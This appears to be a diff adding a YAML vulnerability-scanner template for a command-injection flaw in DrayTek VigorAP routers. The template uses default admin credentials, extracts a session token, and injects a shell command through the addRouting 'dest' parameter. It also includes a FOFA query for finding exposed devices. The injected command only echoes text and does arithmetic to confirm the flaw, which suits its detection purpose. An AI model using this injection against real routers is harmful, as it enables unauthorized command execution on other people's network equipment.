@@ -1,0 +1,31 @@
+id: poc-yaml-draytek-addrouting-rce
+info:
+  name: draytek路由器addrouting命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: VigorAP
+  fofa: header="realm=\"VigorAP910C"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(1000,9999)
+  t2: random_int(100,1000)
+  t3: t1 - t2
+requests:
+- method: GET
+  path: /opmode.asp
+  headers:
+    Authorization: Basic YWRtaW46YWRtaW4=
+  output:
+  - regex_match(body,`<input type="hidden" value=(?P<token>.*?) name=`)
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /goform/addRouting?AuthStr={{.token}}&dest=||+echo+"This+website+has+a+vulnerability+`expr+{{.t1}}+-+{{.t2}}`"%3b%23a
+  headers:
+    Authorization: Basic YWRtaW46YWRtaW4=
+    Referer: '{{.base_url}}'
+  expression: "status_code == 200 && \ncontains(body,t3) && \ncontains(body,\"This\
+    \ website has a vulnerability\")\n"
+transport: http
